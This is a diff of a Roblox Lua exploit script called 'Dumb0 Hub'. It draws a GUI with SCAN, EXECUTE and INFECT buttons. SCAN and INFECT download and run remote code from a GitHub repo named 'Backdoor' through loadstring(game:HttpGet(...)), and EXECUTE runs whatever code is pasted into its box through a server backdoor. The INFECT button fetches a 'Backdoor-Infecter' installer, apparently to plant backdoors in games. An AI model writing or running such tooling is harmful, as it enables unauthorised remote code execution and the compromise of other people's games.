@@ -1,7 +1,7 @@
 -- [[ DUMB0 HUB - REBRANDED & FIXED ]] --
 local G2L = {}
 local username = "its-Dumb0xd"
-local repo = "Dumb0"
+local repo = "Backdoor" -- FIXED: Matches your new repo name
 
 -- Instances:
 G2L["1"] = Instance.new("ScreenGui", game:GetService('CoreGui'):WaitForChild('RobloxGui'))
@@ -15,13 +15,7 @@ G2L["2"]["BackgroundColor3"] = Color3.fromRGB(15, 15, 15)
 G2L["2"]["Size"] = UDim2.new(0, 482, 0, 276)
 G2L["2"]["Position"] = UDim2.new(0.3, 0, 0.3, 0)
 G2L["2"]["Active"] = true
-G2L["2"]["Draggable"] = true -- Mobile friendly dragging
-
-G2L["3"] = Instance.new("UIStroke", G2L["2"])
-G2L["3"]["Color"] = Color3.fromRGB(255, 255, 255)
-G2L["4"] = Instance.new("UIGradient", G2L["3"])
-G2L["4"]["Rotation"] = 50
-G2L["4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 0, 255))}
+G2L["2"]["Draggable"] = true 
 
 Instance.new("UICorner", G2L["2"])
 
@@ -37,7 +31,7 @@ G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], E
 -- Executor Box
 G2L["f"] = Instance.new("Frame", G2L["2"])
 G2L["f"]["BackgroundColor3"] = Color3.fromRGB(22, 22, 22)
-G2L["f"]["Size"] = UDim2.new(0, 450, 0, 150)
+G2L["f"]["Size"] = UDim2.new(0, 450, 0, 120)
 G2L["f"]["Position"] = UDim2.new(0.03, 0, 0.25, 0)
 Instance.new("UICorner", G2L["f"])
 
@@ -49,20 +43,16 @@ G2L["11"]["TextColor3"] = Color3.fromRGB(200, 200, 200)
 G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left
 G2L["11"]["TextYAlignment"] = Enum.TextYAlignment.Top
 G2L["11"]["MultiLine"] = true
-G2L["11"]["ClearTextOnFocus"] = false
 G2L["11"]["Text"] = ""
-G2L["11"]["PlaceholderText"] = "-- Paste script here to execute via backdoor"
+G2L["11"]["PlaceholderText"] = "-- Code goes here"
 
--- Buttons
-local function CreateButton(name, pos, color, text)
+-- Button Helper
+local function CreateButton(pos, color, text)
     local btnFrame = Instance.new("Frame", G2L["2"])
     btnFrame.Size = UDim2.new(0, 140, 0, 35)
     btnFrame.Position = pos
     btnFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
     Instance.new("UICorner", btnFrame)
-    local stroke = Instance.new("UIStroke", btnFrame)
-    stroke.Color = color
-    
     local btn = Instance.new("TextButton", btnFrame)
     btn.Size = UDim2.new(1, 0, 1, 0)
     btn.BackgroundTransparency = 1
@@ -73,32 +63,21 @@ local function CreateButton(name, pos, color, text)
     return btn
 end
 
-local ScanBtn = CreateButton("Scan", UDim2.new(0.03, 0, 0.83, 0), Color3.fromRGB(255, 255, 0), "START SCAN")
-local ExecBtn = CreateButton("Exec", UDim2.new(0.35, 0, 0.83, 0), Color3.fromRGB(0, 255, 0), "EXECUTE")
-local InfectBtn = CreateButton("Infect", UDim2.new(0.67, 0, 0.83, 0), Color3.fromRGB(255, 0, 255), "INFECT")
+local ScanBtn = CreateButton(UDim2.new(0.03, 0, 0.8, 0), Color3.fromRGB(255, 255, 0), "SCAN")
+local ExecBtn = CreateButton(UDim2.new(0.35, 0, 0.8, 0), Color3.fromRGB(0, 255, 0), "EXECUTE")
+local InfectBtn = CreateButton(UDim2.new(0.67, 0, 0.8, 0), Color3.fromRGB(255, 0, 255), "INFECT")
 
--- LOGIC --
-
+-- LOGIC
 ScanBtn.MouseButton1Click:Connect(function()
-    print("Dumb0: Fetching scanner...")
     local url = "https://raw.githubusercontent.com/"..username.."/"..repo.."/main/Backdoor-Scanner/script.lua"
-    local code = game:HttpGet(url)
-    local Scanner = loadstring(code)()
-    Scanner.Scan()
+    loadstring(game:HttpGet(url))().Scan()
 end)
 
 ExecBtn.MouseButton1Click:Connect(function()
-    local code = G2L["11"].Text
-    if code ~= "" then
-        print("Dumb0: Executing custom code...")
-        loadstring(code)()
-    end
+    loadstring(G2L["11"].Text)()
 end)
 
 InfectBtn.MouseButton1Click:Connect(function()
-    print("Dumb0: Fetching infecter...")
     local url = "https://raw.githubusercontent.com/"..username.."/"..repo.."/main/Backdoor-Infecter/installer.lua"
     loadstring(game:HttpGet(url))()
 end)
-
-print("Dumb0 Hub Loaded Successfully.")
